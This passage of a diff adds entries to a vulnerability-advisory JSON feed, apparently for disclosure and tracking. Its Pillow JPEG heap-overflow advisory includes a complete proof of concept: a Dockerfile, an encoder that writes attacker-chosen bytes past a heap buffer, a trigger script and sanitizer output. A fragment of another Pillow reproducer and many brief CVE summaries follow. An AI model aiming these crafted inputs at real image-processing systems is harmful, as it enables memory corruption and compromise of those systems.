MALLOC_PERTURB_=str(perturb)))\n    return p.returncode, p.stdout, p.stderr.strip().splitlines()[-1:] or [\"\"]\n\nleak = False\nfor n in (\"tile_count2.tif\", \"tile_dup.tif\", \"ycbcr_dup.tif\"):\n    r1, a, info = run(n, 85); r2, b, _ = run(n, 170)\n    print(f\"== {n}: {info[0]} rc={r1},{r2}\")\n    if r1 == 0 and r2 == 0 and a != b:\n        i = next(k for k in range(0, len(a), 2) if a[k:k+2] != b[k:k+2])\n        print(f\"   pixel bytes depend on malloc fill pattern from byte {i//2} of {len(a)//2}:\")\n        print(f\"   PERTURB=85 : ...{a[i-8:i+40]}\\n   PERTURB=170: ...{b[i-8:i+40]}\")\n        leak = True\n    else:\n        print(\"   identical output / error -> no leak observed\")\n\nrc, _, info = run(\"tile_big.tif\", 0)\nprint(f\"== tile_big.tif: {info[0]} rc={rc}\" + (\"  (SIGSEGV)\" if rc == -11 else \"\"))\ncrash = rc == -11\nif crash and shutil.which(\"gdb\"):\n    bt = subprocess.run([\"gdb\", \"-batch\", \"-ex\", \"run\", \"-ex\", \"bt 4\", \"--args\", sys.executable, \"-c\", LOAD,\n                         f\"{W}/tile_big.tif\"], capture_output=True, text=True).stdout\n    print(\"\\n\".join(l for l in bt.splitlines() if l.startswith(\"#\")))\nshutil.rmtree(W)\nprint(f\"summary: heap bytes in pixels={leak} stock SIGSEGV={crash}\")\nprint(\"BUG\" if leak or crash else \"OK\")\n```\n</details>",
+      "cvssScore": 8.8,
       "severity": "High",
-      "published": "2026-10-05",
+      "published": "2026-10-20",
+      "modified": "2026-10-20",
+      "cwe": {
+        "cwe_id": "CWE-125",
+        "name": "Out-of-bounds Read"
+      },
+      "references": [
+        "https://github.com/python-pillow/Pillow/security/advisories/GHSA-c6hw-5grf-ff96",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112404",
+        "https://github.com/python-pillow/Pillow/commit/1d4773e6cea0c4a2814e6d4cdc099bbcf56da6ce",
+        "https://github.com/python-pillow/Pillow/releases/tag/13.0.0",
+        "https://github.com/advisories/GHSA-c6hw-5grf-ff96"
+      ],
+      "vulnerableProducts": [
+        "Pillow pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-112403",
+      "summary": "## Summary\n\n`JpegImageFile.draft()` — which `Image.thumbnail()` calls automatically — requests 1/2, 1/4 or 1/8 scaled JPEG output and shrinks `self._size` and the tile extents to match, so `_setimage()` allocates a single-row decode buffer of `ceil(W/s)` samples. `ImagingJpegDecode()` sets `cinfo.scale_num`/`scale_denom`, calls `jpeg_start_decompress()`, and then reads scanlines into that buffer without ever comparing `cinfo.output_width`, `cinfo.output_height` or `cinfo.out_color_components` against `state->xsize`, `state->ysize` and `state->bits`.\n\nlibjpeg-turbo 3.x decodes lossless (SOF3) JPEG, but hardwires lossless streams to no scaling — the requested `scale_denom` is silently discarded. It therefore returns full-width `W`-sample rows into a buffer sized for `ceil(W/s)`. Each `jpeg_read_scanlines()` call writes `(W - ceil(W/s)) x components` bytes past the end of the heap allocation, and the overflowing bytes are the decoded pixel values, which are byte-exact for an 8-bit grayscale lossless image.\n\nThe input is a standards-compliant JPEG, so `Image.open(..., formats=[\"JPEG\"])` does not prevent it. Pillow's Python SOF parser already accepts marker `0xFFC3` (\"SOF3\", \"Spatial lossless\") at 8-bit precision, so the file opens normally as a `JPEG` / mode `L` image at its full declared size.\n\n## Affected code\n\nAt `e41083f383c9cd3db95de52564cc0b6452313d4a` (`main`, 2026-08-29):\n\n- `src/libImaging/JpegDecode.c:224-262` — `ImagingJpegDecode()`; `jpeg_start_decompress()` at :240, `jpeg_read_scanlines()` at :252, with no geometry check between them.\n- `src/decode.c:222-231` — `_setimage()`; `state->buffer = calloc(1, state->bytes)` with `state->bytes = (state->bits * state->xsize + 7) / 8`.\n- `src/PIL/JpegImagePlugin.py:428-464` — `JpegImageFile.draft()`; computes `s` and shrinks `_size`, the tile extents and `decoderconfig` with no notion of lossless coding.\n- `src/PIL/JpegImagePlugin.py:271` — `0xFFC3: (\"SOF3\", \"Spatial lossless\", SOF)`.\n\n```c\n// src/libImaging/JpegDecode.c\n            if (context->scale > 1) {\n                context->cinfo.scale_num = 1;\n                context->cinfo.scale_denom = context->scale;\n            }\n            ...\n        case 2:\n            if (!jpeg_start_decompress(&context->cinfo)) {\n                break;\n            }\n            state->state++;\n            /* fall through */\n        case 3:\n            ok = 1;\n            while (state->y < state->ysize) {\n                ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);\n```\n\nBecause `state->ysize` (`ceil(H/s)`) can never equal libjpeg's `output_height` when `s >= 2`, the decode always ends in an error after the rows have already been written: the caller sees an exception and gets no pixels back. The `OSError` is a consequence of the overflow, not the issue being reported.\n\n## Primitive\n\nPer scanline: a contiguous write of `(W - ceil(W/s)) x c` bytes immediately past a `calloc(ceil(W/s) x c)` block, where `c = 1` for mode `L` and 4 for RGB (RGBX) and CMYK; repeated for `ceil(H/s)` rows over the same region. The buffer size class is chosen by the attacker through `W`, and for grayscale the overflowing content is an arbitrary attacker-chosen byte string.\n\nMeasured in the reproducer below: 1200x1100 mode `L`, `s=2` — a 600-byte allocation, 600 bytes written past it, ASan reporting the whole 1200-byte row write as one `memcpy`.\n\nThreshold: `draft()` must select `s >= 2`, i.e. `W // requested_w >= 2` and `H // requested_h >= 2`. For `thumbnail((256,256))` with the default `reducing_gap=2.0` that means `W, H >= 1024`.\n\n## Reproduction\n\nSelf-contained Docker reproducer (Ubuntu 24.04, clang 20, libjpeg-turbo 3.1.4 and Pillow both built from source with `-fsanitize=address`; Pillow checked out at `${TARGET_COMMIT}`, default `e41083f383c9cd3db95de52564cc0b6452313d4a`). Save the three files below as `Dockerfile`, `make_sof3.py` and `trigger.py` in an empty directory, then:\n\n```bash\ndocker build -t pillow-sof3-oob . && docker run --rm pillow-sof3-oob\n```\n\n`make_sof3.py` is a self-contained encoder that emits a standards-compliant 8-bit grayscale lossless-Huffman JPEG (SOI / DHT / SOF3 `P=8, Y=1100, X=1200, Nf=1` / SOS `Ss=1` predictor 1, `Se=0`, `Ah=Al=0` / entropy-coded row differences / EOI), whose rows carry a repeating marker pattern. `trigger.py` opens it and calls `thumbnail()`, whose implicit `draft()` picks `s=2` and allocates a 600-byte row buffer.\n\n### `Dockerfile`\n\n```dockerfile\nFROM ubuntu:24.04\nENV DEBIAN_FRONTEND=noninteractive\nARG TARGET_COMMIT=e41083f383c9cd3db95de52564cc0b6452313d4a\nARG CLANG_VERSION=20\nARG LIBJPEG_TURBO_TAG=3.1.4\n\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n        ca-certificates git make cmake nasm pkg-config libc6-dev gcc \\\n        wget gnupg lsb-release software-properties-common \\\n        python3 python3-dev python3-pip python3-venv zlib1g-dev \\\n    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \\\n    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \\\n    && rm -rf /var/lib/apt/lists/*\n\nENV CC=clang-20\nENV CXX=clang++-20\nENV CFLAGS=\"-g -fno-omit-frame-pointer -O1 -fsanitize=address\"\nENV CXXFLAGS=\"-g -fno-omit-frame-pointer -O1 -fsanitize=address\"\nENV LDFLAGS=\"-fsanitize=address\"\n\n# --- libjpeg-turbo 3.x (lossless SOF3 support) built with ASan ---\nRUN git clone https://github.com/libjpeg-turbo/libjpeg-turbo /src/libjpeg-turbo\nRUN cd /src/libjpeg-turbo && git checkout ${LIBJPEG_TURBO_TAG} \\\n    && cmake -B /build/ljt -S . -DCMAKE_BUILD_TYPE=None \\\n        -DCMAKE_C_COMPILER=clang-20 \\\n        -DCMAKE_C_FLAGS=\"$CFLAGS\" \\\n        -DCMAKE_EXE_LINKER_FLAGS=\"$LDFLAGS\" \\\n        -DCMAKE_SHARED_LINKER_FLAGS=\"$LDFLAGS\" \\\n        -DCMAKE_INSTALL_PREFIX=/opt/ljt -DWITH_JPEG8=0 -DENABLE_STATIC=0 \\\n    && cmake --build /build/ljt -j\"$(nproc)\" && cmake --install /build/ljt\n\n# --- Pillow at the pinned commit, built with ASan against that libjpeg ---\nRUN git clone https://github.com/python-pillow/Pillow /src/repo\nWORKDIR /src/repo\nRUN git checkout ${TARGET_COMMIT}\n\nENV JPEG_ROOT=/opt/ljt\nENV LD_LIBRARY_PATH=/opt/ljt/lib\nRUN python3 -m venv /venv \\\n    && /venv/bin/pip install --quiet --upgrade pip \"setuptools>=80\" wheel pybind11 \\\n    && CFLAGS=\"$CFLAGS\" LDFLAGS=\"$LDFLAGS -Wl,-rpath,/opt/ljt/lib\" \\\n       /venv/bin/pip install --no-build-isolation --no-deps . \\\n    && ln -sf \"$(clang-20 -print-file-name=libclang_rt.asan-x86_64.so)\" /opt/libasan.so \\\n    && LD_PRELOAD=/opt/libasan.so ASAN_OPTIONS=detect_leaks=0 \\\n       /venv/bin/python3 -c \"from PIL import Image, features; print(Image.__version__, features.version('jpg'))\"\n\nCOPY make_sof3.py /tmp/make_sof3.py\nCOPY trigger.py /tmp/trigger.py\nRUN python3 /tmp/make_sof3.py /tmp/sof3_gray_1200x1100.jpg\n\nENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1\nENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-20/bin/llvm-symbolizer\nENV LD_PRELOAD=/opt/libasan.so\nCMD [\"/bin/sh\",\"-c\",\"cd /tmp && /venv/bin/python3 /tmp/trigger.py 2>&1; echo EXIT=$?\"]\n```\n\n### `make_sof3.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"Generate an 8-bit grayscale lossless-Huffman (SOF3) JPEG.\n\nStandards-compliant per ITU-T T.81 Annex H (lossless mode), predictor 1 (Ra).\nRows carry an attacker-chosen marker byte pattern verbatim (lossless => exact).\n\"\"\"\nimport struct\nimport sys\n\nW = 1200\nH = 1100\nMARKER = b\"AAAABBBBCCCCDDDD\"  # attacker-chosen bytes that land past the buffer\n\nclass BitWriter:\n    def __init__(self):\n        self.out = bytearray()\n        self.acc = 0\n        self.n = 0\n\n    def put(self, value, nbits):\n        for i in range(nbits - 1, -1, -1):\n            self.acc = (self.acc << 1) | ((value >> i) & 1)\n            self.n += 1\n            if self.n == 8:\n                self.out.append(self.acc)\n                if self.acc == 0xFF:\n                    self.out.append(0x00)  # byte stuffing\n                self.acc = 0\n                self.n = 0\n\n    def flush(self):\n        while self.n:\n            self.put(1, 1)\n        return bytes(self.out)\n\n# Canonical Huffman: 17 symbols (categories 0..16), all of code length 5.\nBITS = [0] * 17\nBITS[5] = 17\nHUFFVAL = list(range(17))\nCODES = {sym: (i, 5) for i, sym in enumerate(HUFFVAL)}\n\ndef category(d):\n    if d == 0:\n        return 0\n    return abs(d).bit_length()\n\ndef build_pixels():\n    rows = []\n    for y in range(H):\n        row = bytearray()\n        while len(row) < W:\n            row += MARKER\n        rows.append(bytes(row[:W]))\n    return rows\n\ndef main(path):\n    rows = build_pixels()\n    bw = BitWriter()\n    prev = None\n    for y in range(H):\n        row = rows[y]\n        for x in range(W):\n            s = row[x]\n            if y == 0 and x == 0:\n                pred = 1 << 7          # 2^(P-1-Pt)\n            elif x == 0:\n                pred = prev[0]         # Rb for first sample of a line\n            else:\n                pred = row[x - 1]      # Ra, predictor 1\n            d = (s - pred) & 0xFFFF\n            if d >= 0x8000:\n                d -= 0x10000\n            ssss = category(d)\n            code, length = CODES[ssss]\n            bw.put(code, length)\n            if ssss:\n                v = d if d > 0 else d + (1 << ssss) - 1\n                bw.put(v & ((1 << ssss) - 1), ssss)\n        prev = row\n    entropy = bw.flush()\n\n    out = bytearray()\n    out += b\"\\xff\\xd8\"                                        # SOI\n    # DHT: class 0 (DC/lossless), table id 0\n    dht = bytes([0x00]) + bytes(BITS[1:17]) + bytes(HUFFVAL)\n    out += b\"\\xff\\xc4\" + struct.pack(\">H\", len(dht) + 2) + dht\n    # SOF3: lossless, Huffman, sequential\n    sof = struct.pack(\">BHHB\", 8, H, W, 1) + bytes([1, 0x11, 0])\n    out += b\"\\xff\\xc3\" + struct.pack(\">H\", len(sof) + 2) + sof\n    # SOS: Ns=1, Cs=1, Td=0/Ta=0, Ss=1 (predictor 1), Se=0, Ah=0/Al=0\n    sos = bytes([1, 1, 0x00, 1, 0, 0])\n    out += b\"\\xff\\xda\" + struct.pack(\">H\", len(sos) + 2) + sos\n    out += entropy\n    out += b\"\\xff\\xd9\"                                        # EOI\n    with open(path, \"wb\") as f:\n        f.write(bytes(out))\n    print(f\"wrote {path}: {len(out)} bytes, {W}x{H} 8-bit grayscale SOF3 lossless\")\n\nif __name__ == \"__main__\":\n    main(sys.argv[1] if len(sys.argv) > 1 else \"/tmp/sof3_gray_1200x1100.jpg\")\n```\n\n### `trigger.py`\n\n```python\nimport sys\nfrom PIL import Image, features\nprint(\"Pillow\", Image.__version__, \"| libjpeg\", features.version(\"jpg\"), flush=True)\nim = Image.open(\"/tmp/sof3_gray_1200x1100.jpg\")\nprint(\"format=%s mode=%s size=%s\" % (im.format, im.mode, im.size), flush=True)\nprint(\">>> im.thumbnail((256, 256))  # draft() picks s=2 -> 600-byte row buffer\", flush=True)\nsys.stdout.flush()\ntry:\n    im.thumbnail((256, 256))\n    print(\"thumbnail returned, size=%s\" % (im.size,), flush=True)\nexcept Exception as e:\n    print(\"exception: %r\" % (e,), flush=True)\n```\n\nValidated output:\n\n```\nPillow 13.0.0.dev0 | libjpeg 6.2\nformat=JPEG mode=L size=(1200, 1100)\n>>> im.thumbnail((256, 256))  # draft() picks s=2 -> 600-byte row buffer\n=================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x74e4e904aad8 at pc 0x7784ea4f9422\nWRITE of size 1200 at 0x74e4e904aad8 thread T0\n    #0 __asan_memcpy\n    #1 jcopy_sample_rows /src/libjpeg-turbo/src/wrapper/../jutils.c:121:5\n    #2 sep_upsample /src/libjpeg-turbo/src/wrapper/../jdsample.c:100:3\n    #3 process_data_simple_main /src/libjpeg-turbo/src/wrapper/../jdmainct.c:317:3\n    #4 jpeg_read_scanlines /src/libjpeg-turbo/src/wrapper/../jdapistd.c:359:3\n    #5 ImagingJpegDecode /src/repo/src/libImaging/JpegDecode.c:252:22\n    #6 _decode /src/repo/src/decode.c:132:14\n\n0x74e4e904aad8 is located 0 bytes after 600-byte region [0x74e4e904a880,0x74e4e904aad8)\nallocated by thread T0 here:\n    #0 calloc\n    #1 _setimage /src/repo/src/decode.c:230:34\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow in __asan_memcpy\n```\n\nNegative control, same image: a baseline DCT JPEG of identical dimensions thumbnails cleanly, because libjpeg honours 1/2 scaling exactly as `draft()` computed it.\n\n```\ncontrol baseline DCT JPEG: JPEG L (1200, 1100)\nthumbnail OK, size = (256, 235) -- no ASan report\n```\n\n## Scope and caveats\n\n- Reproduced on `main` at `e41083f383c9cd3db95de52564cc0b6452313d4a`, which is current `origin/main` as of 2026-08-30. Also reported against 12.3.0.\n- Requires the linked libjpeg to support lossless decoding, i.e. libjpeg-turbo >= 3.0. That is what the official Pillow wheels bundle. Builds against libjpeg-turbo 2.x or IJG libjpeg reject SOF3 before any row is decoded and are not affected.\n- No non-default Pillow configuration is involved: `Image.thumbnail()` calls `draft()` by default, and the triggering bytes are entirely file data.\n- Only paths that use `draft()` before loading are affected. `open().load()` and `resize()` decode at scale 1 and are unaffected. Calling `img.load()` before `thumbnail()`, or `thumbnail(..., reducing_gap=None)`, avoids the path in an application today.\n- Not affected on the same code path: SOF11 (arithmetic lossless) fails with `JERR_ARITH_NOTIMPL` before any row; 12- and 16-bit lossless are rejected by Pillow's `SOF()` because it requires `bits == 8`; SOF5-7/13-15 fail with `JERR_SOF_UNSUPPORTED`.\n\n## Credit and disclosure\n\nFound by Anthropic using Claude to study the security of open-source software, validated manually by Ada Logics.\n\nThis report follows Anthropic's coordinated vulnerability disclosure policy\n(https://www.anthropic.com/coordinated-vulnerability-disclosure), with a 90-day\ndisclosure window from the date of this report.\n\nCredit goes to Claude (Anthropic) and Ada Logics.",
+      "cvssScore": 9.2,
+      "severity": "Critical",
+      "published": "2026-10-20",
+      "modified": "2026-10-20",
+      "cwe": {
+        "cwe_id": "CWE-122",
+        "name": "Heap-based Buffer Overflow"
+      },
+      "references": [
+        "https://github.com/python-pillow/Pillow/security/advisories/GHSA-8g5g-8vmr-9782",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112403",
+        "https://github.com/python-pillow/Pillow/commit/242a059aedc1935097d9aa1dc3f099750467ba75",
+        "https://github.com/python-pillow/Pillow/releases/tag/13.0.0",
+        "https://github.com/advisories/GHSA-8g5g-8vmr-9782"
+      ],
+      "vulnerableProducts": [
+        "Pillow pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0407",
+      "summary": "Directory traversal vulnerability in MySQL before 3.23.36 allows local users to modify arbitrary files and gain privileges by creating a database whose name starts with .. (dot dot).",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-06-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0237.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0396.html",
+        "http://www.securityfocus.com/bid/2522",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6617",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0237.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0249",
+      "summary": "Heap overflow in FTP daemon in Solaris 8 allows remote attackers to execute arbitrary commands by creating a long pathname and calling the LIST command, which uses glob to generate long strings.",
+      "cvssScore": 9.8,
+      "severity": "Critical",
+      "published": "2001-06-18",
+      "modified": null,
+      "cwe": "CWE-131",
+      "references": [
+        "http://www.cert.org/advisories/CA-2001-07.html",
+        "http://www.nai.com/research/covert/advisories/048.asp",
+        "http://www.securityfocus.com/bid/2550",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6332",
+        "http://www.cert.org/advisories/CA-2001-07.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1323",
+      "summary": "Elm ME+ 2.4 before PL109S, when installed setgid mail and the operating system lacks POSIX saved ID support, allows local users to read and modify certain files with the privileges of the mail group via unspecified vectors.",
+      "cvssScore": 6.8,
+      "severity": "Medium",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.elmme-mailer.org/elm-2.4ME+PL109S.patch.gz",
+        "http://www.elmme-mailer.org/elm-2.4ME+PL109S.patch.gz"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1324",
+      "summary": "Race condition in the can_open function in Elm ME+ 2.4, when installed setgid mail and the operating system lacks POSIX saved ID support, allows local users to read and modify certain files with the privileges of the mail group.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.elmme-mailer.org/elm-2.4ME+PL109S.patch.gz",
+        "http://www.elmme-mailer.org/elm-2.4ME+PL109S.patch.gz"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0984",
+      "summary": "Real time clock (RTC) routines in Linux kernel 2.4.23 and earlier do not properly initialize their structures, which could leak kernel data to user space.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2004-01-05",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000799",
+        "http://marc.info/?l=bugtraq&m=107394143105081&w=2",
+        "http://secunia.com/advisories/10533",
+        "http://secunia.com/advisories/10536",
+        "http://secunia.com/advisories/10537"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0995",
+      "summary": "Buffer overflow in the Microsoft Message Queue Manager (MSQM) allows remote attackers to cause a denial of service (RPC service crash) via a queue registration request.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-01-05",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-039",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13131",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-039",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13131"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0996",
+      "summary": "Unknown \"System Security Vulnerability\" in Computer Associates (CA) Unicenter Remote Control (URC) 6.0 allows attackers to gain privileges via the help interface.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2004-01-05",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://support.ca.com/techbases/rp/urc6x-secnote.html",
+        "http://www.secunia.com/advisories/10420/",
+        "http://support.ca.com/techbases/rp/urc6x-secnote.html",
+        "http://www.secunia.com/advisories/10420/"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0636",
+      "summary": "Buffer overflow in the goaway function in the aim:goaway URI handler for AOL Instant Messenger (AIM) 5.5, including 5.5.3595, allows remote attackers to execute arbitrary code via a long Away message.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2004-11-23",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/12198/",
+        "http://www.idefense.com/application/poi/display?id=121&type=vulnerabilities",
+        "http://www.kb.cert.org/vuls/id/735966",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16926",
+        "http://secunia.com/advisories/12198/"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-1027",
+      "summary": "Cisco Secure PIX Firewall 5.2(2) allows remote attackers to determine the real IP address of a target FTP server by flooding the server with PASV requests, which includes the real IP address in the response when passive mode is established.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-12-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=97059440000367&w=2",
+        "http://www.osvdb.org/1623",
+        "http://www.securityfocus.com/bid/1877",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5646",
+        "http://marc.info/?l=bugtraq&m=97059440000367&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0263",
+      "summary": "Buffer overflow in EasyBoard 2000 1.27 (aka EZboard) allows remote attackers to execute arbitrary code via a long boundary value in a multipart Content-Type header to (1) ezboard.cgi, (2) ezman.cgi, or (3) ezadmin.cgi.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101345069220199&w=2",
+        "http://www.iss.net/security_center/static/8162.php",
+        "http://www.securityfocus.com/bid/4068",
+        "http://marc.info/?l=bugtraq&m=101345069220199&w=2",
+        "http://www.iss.net/security_center/static/8162.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0120",
+      "summary": "Sun/Solaris utmp file allows local users to gain root access if it is writable by users other than root.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1994-03-21",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/126",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/126"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0489",
+      "summary": "FreeBSD, NetBSD, and OpenBSD allow an attacker to cause a denial of service by creating a large number of socket pairs using the socketpair function, setting a large buffer size via setsockopt, then writing large buffers.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "1999-09-05",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/622",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=NCBBKFKDOLAGKIAPMILPCEJLCEAA.labs%40ussrback.com",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=Pine.LNX.4.10.9908270039010.16315-100000%40thetis.deor.org",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3298",
+        "http://www.securityfocus.com/bid/622"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0632",
+      "summary": "Buffer overflow in the web archive component of L-Soft Listserv 1.8d and earlier allows remote attackers to execute arbitrary commands via a long query string.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2000-07-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.lsoft.com/news/default.asp?item=Advisory1",
+        "http://www.nai.com/nai_labs/asp_set/advisory/43_Advisory.asp",
+        "http://www.securityfocus.com/bid/1490",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4952",
+        "http://www.lsoft.com/news/default.asp?item=Advisory1"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "GHSA-V25G-RJ4Q-4Q96",
+      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-11-03",
+      "modified": "2026-11-04",
+      "cwe": null,
+      "references": [
+        "https://github.com/advisories/GHSA-v25g-rj4q-4q96"
+      ],
+      "vulnerableProducts": [
+        "nulio-connector npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-93009",
+      "summary": "A flaw was found in dnsmasq. The DHCPv6 client hostname parser can read one byte past the end of a crafted FQDN option because it checks the next label length before confirming the pointer is still inside the option. An attacker on the local network can trigger this with a single DHCPv6 packet. The extra byte is not returned to the client or logged, and no crash has been demonstrated.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2026-10-29",
+      "modified": null,
+      "cwe": "CWE-125",
+      "references": [
+        "https://access.redhat.com/security/cve/CVE-2026-93009",
+        "https://bugzilla.redhat.com/show_bug.cgi?id=2536083"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-61673",
+      "summary": "WeGIA is a web manager for charitable institutions. Prior to 3.8.7, a stored DOM cross-site scripting vulnerability in `web/html/memorando/listar_despachos.php` results from unsafe handling of the `texto` field. The affected flow spans `web/controle/memorando/DespachoControle.php` and `web/dao/memorando/DespachoDAO.php`: `FILTER_SANITIZE_SPECIAL_CHARS` is applied during storage, but `html_entity_decode()` later decodes the stored content and `jQuery .html()` inserts the result into the DOM. An attacker able to submit a memorandum dispatch through `/controle/control.php` using `DespachoControle` and `metodo=incluir` can store malicious HTML or JavaScript. The code executes automatically when another user views the memorandum thread through `/html/memorando/listar_despachos.php` with `id_memorando`. This permits arbitrary JavaScript execution, theft of administrator `PHPSESSID` session tokens, privileged session hijacking, account takeover, and unauthorized access to privileged or internal functionality. This issue is fixed in version 3.8.7.",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2026-10-29",
+      "modified": null,
+      "cwe": "CWE-79",
+      "references": [
+        "https://github.com/LabRedesCefetRJ/WeGIA/commit/9524556c5940149e20cea389d2966dd010d3b5af",
+        "https://github.com/LabRedesCefetRJ/WeGIA/issues/516",
+        "https://github.com/LabRedesCefetRJ/WeGIA/releases/tag/3.8.7",
+        "https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-83p7-cx5x-7g34",
+        "https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-83p7-cx5x-7g34"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0464",
+      "summary": "Internet Explorer 4.x and 5.x allows remote attackers to execute arbitrary commands via a buffer overflow in the ActiveX parameter parsing capability, aka the \"Malformed Component Attribute\" vulnerability.",
+      "cvssScore": 7.6,
+      "severity": "High",
+      "published": "2000-05-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.microsoft.com/technet/support/kb.asp?ID=261257",
+        "http://www.securityfocus.com/bid/1223",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-033",
+        "http://www.microsoft.com/technet/support/kb.asp?ID=261257",
+        "http://www.securityfocus.com/bid/1223"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-1029",
+      "summary": "Buffer overflow in host command allows a remote attacker to execute arbitrary commands via a long response to an AXFR query.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2000-12-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/141660",
+        "http://www.securityfocus.com/bid/1887",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5462",
+        "http://www.securityfocus.com/archive/1/141660",
+        "http://www.securityfocus.com/bid/1887"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-1030",
+      "summary": "CS&T CorporateTime for the Web returns different error messages for invalid usernames and invalid passwords, which allows remote attackers to determine valid usernames on the server.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-12-11",
